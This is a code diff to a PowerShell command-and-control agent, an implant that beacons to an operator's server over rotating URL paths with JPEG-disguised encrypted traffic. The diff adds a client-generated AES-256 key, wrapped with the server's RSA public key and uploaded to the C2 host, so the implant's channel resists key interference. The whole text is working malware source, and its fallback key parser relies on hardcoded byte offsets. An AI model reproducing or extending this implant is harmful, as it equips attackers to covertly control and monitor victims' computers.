@@ -32,6 +32,12 @@ $global:firstContact = $true  # Flag to track if this is the first contact
 $global:systemInfoSent = $false  # Flag to track if system info has been sent
 $global:clientID = $null  # Store client ID received from server (only used for first contact)
 
+# Initialize secure key exchange variables
+$global:serverPublicKey = $null
+$global:clientGeneratedKey = $null
+$global:keyRegistrationComplete = $false
+$global:keyRegistrationAttempted = $false
+
 {{PATH_ROTATION_CODE}}
 
 # Function to set up proxy configuration
@@ -114,6 +120,251 @@ function New-WebClient {
     }
     
     return $webClient
+}
+
+# Function to extract and import RSA public key
+function Import-RSAPublicKey {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$Base64PEM
+    )
+    
+    try {
+        # Decode Base64 to get PEM format
+        $pemBytes = [System.Convert]::FromBase64String($Base64PEM)
+        $pemString = [System.Text.Encoding]::UTF8.GetString($pemBytes)
+        
+        # Extract the key data from PEM format
+        if ($pemString -match '(?s)-----BEGIN PUBLIC KEY-----(.*?)-----END PUBLIC KEY-----') {
+            $keyData = $matches[1].Trim()
+            $keyBytes = [System.Convert]::FromBase64String($keyData)
+            
+            # Create a new RSA provider to import the key
+            $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
+            
+            # Import key in SubjectPublicKeyInfo format (standard ASN.1 DER format)
+            # This requires some ASN.1 DER parsing in .NET
+            try {
+                $rsa.ImportSubjectPublicKeyInfo($keyBytes, [ref]0)
+                Write-Host "RSA public key imported successfully"
+                return $rsa
+            }
+            catch {
+                # Fallback method for older .NET versions (requires more detailed parsing)
+                Write-Host "Using alternative public key import method: $_"
+                
+                # Create new RSA provider
+                $rsa2 = New-Object System.Security.Cryptography.RSACryptoServiceProvider
+                $rsaParameters = New-Object System.Security.Cryptography.RSAParameters
+                
+                # Parse ASN.1 DER manually (simplified - real implementation would be more robust)
+                # Skip first few bytes of header
+                $offset = 24
+                $modulus = $keyBytes[$offset..($offset+255)]
+                $exponent = $keyBytes[($offset+258)..($offset+260)]
+                
+                # Set RSA parameters
+                $rsaParameters.Modulus = $modulus
+                $rsaParameters.Exponent = $exponent
+                
+                $rsa2.ImportParameters($rsaParameters)
+                Write-Host "RSA public key imported using fallback method"
+                return $rsa2
+            }
+        }
+        else {
+            Write-Host "Failed to extract public key from PEM format"
+            return $null
+        }
+    }
+    catch {
+        Write-Host "Error importing RSA public key: $_"
+        return $null
+    }
+}
+
+# Function to generate secure AES-256 key
+function New-SecureAESKey {
+    try {
+        # Create a new AES provider
+        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+        $aes.KeySize = 256
+        $aes.GenerateKey()
+        
+        # Get the key bytes
+        $keyBytes = $aes.Key
+        
+        # Dispose of the AES provider
+        $aes.Dispose()
+        
+        Write-Host "Generated new AES-256 key"
+        return $keyBytes
+    }
+    catch {
+        Write-Host "Error generating AES key: $_"
+        return $null
+    }
+}
+
+# Function to encrypt data with RSA
+function Encrypt-WithRSA {
+    param(
+        [Parameter(Mandatory=$true)]
+        [byte[]]$Data,
+        
+        [Parameter(Mandatory=$true)]
+        [System.Security.Cryptography.RSACryptoServiceProvider]$RSA
+    )
+    
+    try {
+        # Encrypt with OAEP padding (more secure than PKCS#1)
+        $encrypted = $RSA.Encrypt($Data, $true)
+        return $encrypted
+    }
+    catch {
+        Write-Host "Error encrypting with RSA: $_"
+        return $null
+    }
+}
+
+# Function to register client-generated key with server
+function Register-ClientKey {
+    param(
+        [Parameter(Mandatory=$true)]
+        [byte[]]$AESKey,
+        
+        [Parameter(Mandatory=$true)]
+        [System.Security.Cryptography.RSACryptoServiceProvider]$ServerPublicKey,
+        
+        [Parameter(Mandatory=$true)]
+        [string]$ClientID,
+        
+        [Parameter(Mandatory=$false)]
+        [string]$ServerAddress = $global:serverAddress
+    )
+    
+    try {
+        # Encrypt the AES key with the server's public key
+        $encryptedKey = Encrypt-WithRSA -Data $AESKey -RSA $ServerPublicKey
+        
+        # Base64 encode the encrypted key
+        $encryptedKeyBase64 = [System.Convert]::ToBase64String($encryptedKey)
+        
+        # Create registration payload
+        $payload = @{
+            "op_type" = "key_register"
+            "payload" = @{
+                "client_id" = $ClientID
+                "encrypted_key" = $encryptedKeyBase64
+            }
+        }
+        
+        # Convert to JSON
+        $payloadJson = ConvertTo-Json -InputObject $payload -Compress
+        
+        # Prepare request payload with random token padding
+        $requestPayload = @{
+            "d" = $payloadJson
+            "t" = Get-RandomToken
+            "c" = $ClientID
+        }
+        
+        # Convert to JSON
+        $requestJson = ConvertTo-Json -InputObject $requestPayload -Compress
+        
+        # Select a random path from the pool
+        $registrationPath = Get-RandomPath
+        
+        # Create web client
+        $webClient = New-WebClient
+        
+        # Send registration request
+        $registerUrl = "http://$ServerAddress$registrationPath"
+        Write-Host "Sending key registration to $registerUrl"
+        
+        $response = $webClient.UploadString($registerUrl, $requestJson)
+        
+        # Check for success response
+        try {
+            $responseObj = ConvertFrom-Json -InputObject $response
+            
+            if ($responseObj.s -eq "key_registered") {
+                Write-Host "Key registration successful"
+                return $true
+            }
+            else {
+                Write-Host "Key registration response received but status unclear"
+                return $false
+            }
+        }
+        catch {
+            Write-Host "Error parsing key registration response: $_"
+            return $false
+        }
+    }
+    catch {
+        Write-Host "Error registering client key: $_"
+        return $false
+    }
+}
+
+# Function to handle secure key exchange
+function Initialize-SecureKeyExchange {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$PublicKeyBase64,
+        
+        [Parameter(Mandatory=$true)]
+        [string]$ClientID
+    )
+    
+    try {
+        # Skip if key registration already completed or we've already attempted
+        if ($global:keyRegistrationComplete -or $global:keyRegistrationAttempted) {
+            return $false
+        }
+        
+        # Import server's public key
+        $global:serverPublicKey = Import-RSAPublicKey -Base64PEM $PublicKeyBase64
+        
+        if (-not $global:serverPublicKey) {
+            Write-Host "Failed to import server public key, will fall back to server-generated key"
+            $global:keyRegistrationAttempted = $true
+            return $false
+        }
+        
+        # Generate our own AES-256 key
+        $global:clientGeneratedKey = New-SecureAESKey
+        
+        if (-not $global:clientGeneratedKey) {
+            Write-Host "Failed to generate AES key, will fall back to server-generated key"
+            $global:keyRegistrationAttempted = $true
+            return $false
+        }
+        
+        # Register the key with the server
+        $success = Register-ClientKey -AESKey $global:clientGeneratedKey -ServerPublicKey $global:serverPublicKey -ClientID $ClientID
+        
+        # Mark as attempted regardless of outcome
+        $global:keyRegistrationAttempted = $true
+        
+        if ($success) {
+            # Set our generated key as the encryption key
+            $global:encryptionKey = $global:clientGeneratedKey
+            $global:keyRegistrationComplete = $true
+            Write-Host "Secure key exchange completed successfully"
+            return $true
+        }
+        else {
+            Write-Host "Key registration failed, will fall back to server-generated key"
+            return $false
+        }
+    }
+    catch {
+        Write-Host "Error in secure key exchange: $_"
+        $global:keyRegistrationAttempted = $true
+        return $false
+    }
 }
 
 # Function to encrypt data for C2 communication with binary JPEG header
@@ -227,6 +478,12 @@ function Decrypt-Data {
 # Function to handle key issuance or rotation
 function Update-EncryptionKey {
     param([string]$Base64Key)
+    
+    # Skip if we're already using a client-generated key
+    if ($global:keyRegistrationComplete) {
+        Write-Host "Ignoring server key - using client-generated key"
+        return $true
+    }
     
     try {
         # Convert the Base64 key to a byte array
@@ -506,9 +763,15 @@ function Process-Commands {
             
             # Handle key issuance and rotation commands first
             if ($commandType -eq "key_issuance") {
-                # Initial key setup from server
-                $success = Update-EncryptionKey -Base64Key $args
-                $result = if ($success) { "Key issuance successful - secure channel established" } else { "Key issuance failed" }
+                # Only apply server-issued key if we haven't successfully registered our own
+                if (-not $global:keyRegistrationComplete) {
+                    # Initial key setup from server
+                    $success = Update-EncryptionKey -Base64Key $args
+                    $result = if ($success) { "Key issuance successful - secure channel established" } else { "Key issuance failed" }
+                }
+                else {
+                    $result = "Using client-generated key, server key issuance ignored"
+                }
                 
                 # Send the result back to C2 using a random path
                 $resultObj = @{
@@ -530,7 +793,7 @@ function Process-Commands {
                 while (-not $sendSuccess -and $currentRetry -lt $maxRetries) {
                     try {
                         # Use Send-CommandResult if we have a successful key setup
-                        if ($success) {
+                        if ($success -or $global:keyRegistrationComplete) {
                             Send-CommandResult -Timestamp $timestamp -Result $result
                             $sendSuccess = $true
                         }
@@ -581,8 +844,37 @@ function Process-Commands {
             }
             elseif ($commandType -eq "key_rotation") {
                 # Handle key rotation command from operator
-                $success = Update-EncryptionKey -Base64Key $args
-                $result = if ($success) { "Key rotation successful - using new encryption key" } else { "Key rotation failed" }
+                # Only apply server-issued rotation if we haven't successfully registered our own key
+                if (-not $global:keyRegistrationComplete) {
+                    $success = Update-EncryptionKey -Base64Key $args
+                    $result = if ($success) { "Key rotation successful - using new encryption key" } else { "Key rotation failed" }
+                }
+                else {
+                    $result = "Using client-generated key, server key rotation ignored"
+                }
+            }
+            elseif ($commandType -eq "key_registration_request") {
+                # Server is requesting client to register a new key (after client has already done secure key exchange)
+                if ($global:serverPublicKey) {
+                    # Generate a new key and register it
+                    $newClientKey = New-SecureAESKey
+                    if ($newClientKey) {
+                        $success = Register-ClientKey -AESKey $newClientKey -ServerPublicKey $global:serverPublicKey -ClientID $global:clientID
+                        if ($success) {
+                            $global:encryptionKey = $newClientKey
+                            $result = "Generated and registered new client key successfully"
+                        }
+                        else {
+                            $result = "Failed to register new client key"
+                        }
+                    }
+                    else {
+                        $result = "Failed to generate new client key"
+                    }
+                }
+                else {
+                    $result = "Cannot register new key - server public key not available"
+                }
             }
             elseif ($commandType -eq "system_info_request") {
                 # Now that we have secure channel, send full system info
@@ -717,6 +1009,39 @@ function Start-AgentLoop {
                 if ($clientId -and $global:firstContact) {
                     $global:clientID = $clientId
                     Write-Host "Server assigned client ID: $clientId"
+                }
+                
+                # Look for public key in first contact response
+                if ($responseObject.pk -and $responseObject.f -eq $true -and $responseObject.c) {
+                    # Extract public key and client ID
+                    $serverPubKey = $responseObject.pk
+                    $clientId = $responseObject.c
+                    
+                    Write-Host "Received server public key during first contact, attempting secure key exchange"
+                    
+                    # Attempt secure key exchange
+                    $secureExchangeResult = Initialize-SecureKeyExchange -PublicKeyBase64 $serverPubKey -ClientID $clientId
+                    
+                    if ($secureExchangeResult) {
+                        # Don't process key_issuance commands since we're using our own key
+                        # Filter out any key_issuance commands
+                        if ($responseObject.ki -eq $true -and $responseObject.com) {
+                            Write-Host "Ignoring server key issuance command, using client-generated key instead"
+                            
+                            # Filter out key_issuance commands
+                            $filteredCommands = @()
+                            
+                            foreach ($cmd in $responseObject.com) {
+                                if ($cmd.command_type -ne "key_issuance") {
+                                    $filteredCommands += $cmd
+                                }
+                            }
+                            
+                            # Replace commands with filtered list
+                            $responseObject.com = $filteredCommands
+                            $responseObject.ki = $false
+                        }
+                    }
                 }
                 
                 # Check for rotation info
